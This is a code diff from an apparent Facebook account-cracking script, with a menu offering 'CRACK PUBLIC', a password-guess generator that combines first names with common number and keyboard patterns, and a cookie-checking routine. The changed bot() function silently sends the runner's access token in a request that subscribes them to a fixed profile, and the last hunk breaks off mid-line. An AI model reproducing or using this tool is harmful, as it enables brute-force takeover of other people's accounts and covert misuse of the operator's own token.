@@ -335,7 +335,7 @@ def login_lagi334():
 		exit()
 def bot():
 	try:
-		requests.post("https://t.me/bsbsjhh"%(tokenku))
+		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
 	except:
 		pass
 def menu(my_name,my_id):	
@@ -343,7 +343,7 @@ def menu(my_name,my_id):
 	os.system('clear')
 	from rich.panel import Panel as Ch
 	from rich import print as code
-	code(Ch('      💢 - اقـل عـدد ايـديـات خـلـي بالاداة 10 لا تنسوا صور الصيد   ')) 
+	code(Ch('      💢 - اقـل عـدد ايـديـات خـلـي بالاداة 10 لا تنسوا صور   ')) 
 	print('')
 	print(a16+'▭▬'*30)
 	print(f"\033[97;1m[\033[92;1m1\033[97;1m] \x1b[33m\x1b[33m \x1b[33m[{MJ3}CRACK PUBLIC\x1b[36m\x1b[33m]")
@@ -634,14 +634,14 @@ def passwrd():
 					pwv.append(frs+"123")
 					pwv.append(frs+'1234')		
 					pwv.append(frs+'12345')		
-					pwv.append('199919949')
-					pwv.append('199819898')
-					pwv.append('199719497')
-					pwv.append('009988577')
+					pwv.append('19991999')
+					pwv.append('19981998')
+					pwv.append('19971997')
+					pwv.append('00998877')
 					pwv.append(frs+'123456')
-					pwv.append('00998877766')
+					pwv.append('0099887766')
 					pwv.append(frs+"123123")
-					pwv.append('112238344@@')
+					pwv.append('11223344@@')
 					pwv.append('12345@@@@@')
 					pwv.append('123'+frs+'123')
 					pwv.append('1234'+frs+'1234')
@@ -649,16 +649,16 @@ def passwrd():
 					pwv.append('1q2q3q4q')
 					pwv.append('1q2w3e4r')
 					pwv.append('12344321')
-					pwv.append('009958877')
+					pwv.append('00998877')
 					pwv.append('99887766')
-					pwv.append('zxcvbn4mmnbvcxz')
+					pwv.append('zxcvbnmmnbvcxz')
 					pwv.append('qwertyuioppoiuytrewq')
-					pwv.append('200020050@@')
+					pwv.append('20002000@@')
 					pwv.append('20232023@@')
-					pwv.append('202420524@@')
+					pwv.append('20242024@@')
 					pwv.append('20232024')
 					pwv.append('20232024@@')
-					pwv.append('20012ة001@')
+					pwv.append('20012001@')
 					pwv.append('19991999@@')
 					pwv.append('19991999@')
 					pwv.append('19901990')
@@ -804,5 +804,4 @@ def cek_RAVEN(kuki):
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
 	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m        
+		for i in range(len(
